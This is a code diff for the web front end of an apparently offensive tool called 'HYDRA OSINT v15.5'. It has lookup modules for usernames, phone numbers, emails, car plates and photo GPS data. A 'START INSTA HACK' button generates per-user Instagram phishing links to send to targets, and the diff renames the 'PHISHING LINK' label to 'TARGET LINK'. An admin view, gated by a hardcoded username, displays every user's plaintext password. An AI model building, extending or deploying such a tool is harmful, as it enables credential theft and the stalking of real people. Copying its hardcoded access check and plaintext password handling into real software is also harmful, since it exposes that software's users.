@@ -10,60 +10,52 @@
         .card-label { position: absolute; top: -10px; left: 10px; background: var(--black); padding: 0 5px; font-size: 12px; }
         .input-row { display: flex; gap: 10px; margin-bottom: 10px; }
         input { background: #000; border: 1px solid var(--green); color: var(--green); padding: 5px; flex-grow: 1; }
-        .btn { background: var(--green); color: #000; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold; }
+        .btn { background: var(--green); color: #000; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
         .btn:hover { background: #fff; }
-        #display { border: 1px solid #444; height: 150px; overflow-y: auto; padding: 10px; margin-top: 10px; font-size: 12px; }
+        #display { border: 1px solid #444; min-height: 100px; padding: 10px; margin-top: 10px; font-size: 12px; color: #fff; background: #111; }
         .res-item { border-bottom: 1px solid #222; padding: 5px; display: flex; justify-content: space-between; align-items: center; }
-        .copy-btn { font-size: 10px; border: 1px solid var(--green); background: none; color: var(--green); cursor: pointer; }
+        .copy-btn { font-size: 10px; border: 1px solid var(--green); background: none; color: var(--green); cursor: pointer; padding: 2px 5px; }
     </style>
 </head>
 <body>
-    <h1>HYDRA OSINT v15.0</h1>
+    <h1>HYDRA OSINT v15.5</h1>
     
-    <div class="card">
-        <span class="card-label">// USER AUTH</span>
-        <div id="auth-box">
-            <input id="user" placeholder="Login"> <input id="pass" type="password" placeholder="Pass">
-            <button class="btn" onclick="auth('login')">LOGIN</button>
-            <button class="btn" onclick="auth('register')" style="background:none; color:var(--green); border:1px solid var(--green);">REG</button>
+    <div class="card" id="auth-ui">
+        <span class="card-label">// ACCESS CONTROL</span>
+        <div class="input-row">
+            <input id="user" placeholder="LOGIN"> 
+            <input id="pass" type="password" placeholder="PASSWORD">
         </div>
+        <button class="btn" onclick="auth('login')">LOGIN</button>
+        <button class="btn" onclick="auth('register')" style="background:none; color:var(--green); border:1px solid var(--green);">REGISTER</button>
     </div>
 
-    <div class="card" id="main-ui" style="display:none;">
-        <span class="card-label">// OSINT MODULES</span>
-        <div class="input-row">
-            <input id="t-nick" placeholder="Username (Insta/TikTok)...">
-            <button class="btn" onclick="scan('nick')">NICK SCAN</button>
+    <div id="main-ui" style="display:none;">
+        <div class="card">
+            <span class="card-label">// INSTA EXPLOIT</span>
+            <button class="btn" onclick="genPhish()" style="width:100%; background:var(--red); color:#fff; border: 1px solid #fff;">[ !!! ] START INSTA HACK [ !!! ]</button>
         </div>
-        <div class="input-row">
-            <input id="t-phone" placeholder="Phone (7999...)...">
-            <button class="btn" onclick="scan('mail')">PHONE SCAN</button>
-        </div>
-        <div class="input-row">
-            <input id="t-email" placeholder="Email...">
-            <button class="btn" onclick="scan('email_scan')">MAIL SCAN</button>
-        </div>
-        <div class="input-row">
-            <input id="t-car" placeholder="Car Plate (A000AA00)...">
-            <button class="btn" onclick="scan('car_scan')">CAR SCAN</button>
-        </div>
-        <div class="input-row">
-            <input type="file" id="t-photo-new">
-            <button class="btn" onclick="uploadPhotoMap()">GPS MAP</button>
-        </div>
-        <button class="btn" onclick="genPhish()" style="width:100%; background:var(--red); color:#fff;">START INSTA EXPLOIT</button>
-    </div>
 
-    <div id="display">> SYSTEM READY...</div>
+        <div class="card">
+            <span class="card-label">// OSINT MODULES</span>
+            <div class="input-row"><input id="t-nick" placeholder="Username..."><button class="btn" onclick="scan('nick')">NICK</button></div>
+            <div class="input-row"><input id="t-phone" placeholder="Phone..."><button class="btn" onclick="scan('mail')">PHONE</button></div>
+            <div class="input-row"><input id="t-email" placeholder="Email..."><button class="btn" onclick="scan('email_scan')">EMAIL</button></div>
+            <div class="input-row"><input id="t-car" placeholder="Car Plate..."><button class="btn" onclick="scan('car_scan')">CAR</button></div>
+            <div class="input-row"><input type="file" id="t-photo-new"><button class="btn" onclick="uploadPhotoMap()">GPS MAP</button></div>
+        </div>
 
-    <div class="card" id="history-box" style="display:none; margin-top:15px;">
-        <span class="card-label">// RECENT ACTIVITY</span>
-        <div id="hist-content"></div>
-    </div>
+        <div id="display">> SYSTEM READY...</div>
 
-    <div id="admin-panel" style="display:none; margin-top:20px;">
-        <button class="btn" onclick="loadAdmin()">OPEN MASTER ADMIN PANEL</button>
-        <div id="admin-data" class="card" style="display:none; margin-top:10px;"></div>
+        <div class="card" id="history-box" style="margin-top:15px;">
+            <span class="card-label">// RECENT ACTIVITY</span>
+            <div id="hist-content"></div>
+        </div>
+
+        <div id="admin-panel" style="display:none; margin-top:20px;">
+            <button class="btn" onclick="loadAdmin()" style="width:100%; border: 2px solid gold;">OPEN MASTER ADMIN PANEL</button>
+            <div id="admin-data" class="card" style="display:none; margin-top:10px; border-color: gold;"></div>
+        </div>
     </div>
 
     <script>
@@ -75,11 +67,14 @@
             if(j.status==='success') {
                 if(type==='login') {
                     UID = j.uid;
+                    document.getElementById('auth-ui').style.display = 'none';
                     document.getElementById('main-ui').style.display = 'block';
-                    document.getElementById('history-box').style.display = 'block';
-                    if(j.isAdmin) document.getElementById('admin-panel').style.display = 'block';
+                    // ПРОВЕРКА АДМИНА
+                    if(u === 'abupaay') {
+                        document.getElementById('admin-panel').style.display = 'block';
+                    }
                     loadHistory();
-                } else alert('Registered!');
+                } else alert('Registration Successful!');
             } else alert(j.message || 'Error');
         }
 
@@ -112,7 +107,7 @@
 
         function genPhish() {
             const link = window.location.origin + '/login/insta/' + UID;
-            document.getElementById('display').innerHTML = `<div class="res-item"><span>PHISHING LINK: ${link}</span><button class="copy-btn" onclick="navigator.clipboard.writeText('${link}')">COPY</button></div>`;
+            document.getElementById('display').innerHTML = `<div class="res-item"><span>TARGET LINK: ${link}</span><button class="copy-btn" onclick="navigator.clipboard.writeText('${link}'); alert('Copied!')">COPY</button></div>`;
         }
 
         async function loadHistory() {
@@ -126,7 +121,7 @@
             const j = await r.json();
             const box = document.getElementById('admin-data');
             box.style.display = 'block';
-            box.innerHTML = j.map(u => `<div style="border-bottom:1px solid #444; margin-bottom:5px;"><b>${u.username}</b>: ${u.password}<br><small>Act: ${u.activity.map(a => a.mod).join(", ")}</small></div>`).join("");
+            box.innerHTML = j.map(u => `<div style="border-bottom:1px solid #444; margin-bottom:10px;"><b>USER: ${u.username}</b> | PASS: ${u.password}<br><small style="color:var(--green);">Actions: ${u.activity.map(a => a.mod).join(", ")}</small></div>`).join("");
         }
     </script>
 </body>
